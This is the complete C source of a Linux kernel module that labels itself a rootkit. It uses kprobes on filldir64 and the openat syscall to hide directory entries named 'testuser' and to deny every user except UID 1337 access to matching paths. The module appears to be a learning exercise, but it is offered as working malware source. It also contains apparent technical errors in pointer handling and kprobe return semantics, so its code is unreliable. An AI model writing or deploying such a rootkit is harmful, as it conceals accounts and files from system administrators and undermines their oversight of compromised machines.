#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/cred.h>
#include <linux/uaccess.h>
#include <linux/string.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/syscalls.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nathan, FL");
MODULE_DESCRIPTION("Rootkit - Hide user testuser and intercept file access");
MODULE_VERSION("1.0");

#define HIDDEN_USER "testuser"
#define HIDDEN_UID 1337 

static struct kprobe kp_filldir, kp_openat;

static int handler_pre_filldir(struct kprobe *p, struct pt_regs *regs) {
    const char __user *name_user = (const char __user *)regs->si;
    char name[256] = {0};

    if (!copy_from_user(name, name_user, sizeof(name) - 1)) {
        if (strstr(name, HIDDEN_USER)) {
            printk(KERN_INFO "rootkit: Masquage de l'entrée '%s'\n", name);
            return 0;
        }
    }
    return 1; 
}

static int handler_pre_openat(struct kprobe *p, struct pt_regs *regs) {
    kuid_t current_uid = current_uid();
    char __user *filename_user = (char __user *)regs->si;
    char filename[256] = {0};

    if (current_uid.val != HIDDEN_UID) {
        if (!copy_from_user(filename, filename_user, sizeof(filename) - 1)) {
            filename[sizeof(filename) - 1] = '\0'; 
            if (strstr(filename, HIDDEN_USER)) {
                printk(KERN_INFO "rootkit: Accès bloqué à %s pour UID %d\n", filename, current_uid.val);
                regs->ax = -ENOENT; 
                return 0;
            }
        }
    }
    return 1; 
}

static int __init rootkit_init(void) {
    int ret;

    printk(KERN_INFO "rootkit: Initialisation\n");

    kp_filldir.symbol_name = "filldir64";
    kp_filldir.pre_handler = handler_pre_filldir;
    ret = register_kprobe(&kp_filldir);
    if (ret < 0) {
        printk(KERN_ERR "rootkit: Échec d'enregistrement de kprobe filldir64, code %d\n", ret);
        return ret;
    }

    kp_openat.symbol_name = "__x64_sys_openat";
    kp_openat.pre_handler = handler_pre_openat;
    ret = register_kprobe(&kp_openat);
    if (ret < 0) {
        unregister_kprobe(&kp_filldir);
        printk(KERN_ERR "rootkit: Échec d'enregistrement de kprobe openat, code %d\n", ret);
        return ret;
    }

    printk(KERN_INFO "rootkit: Kprobes enregistrés\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    unregister_kprobe(&kp_filldir);
    unregister_kprobe(&kp_openat);
    printk(KERN_INFO "rootkit: Kprobes supprimés\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
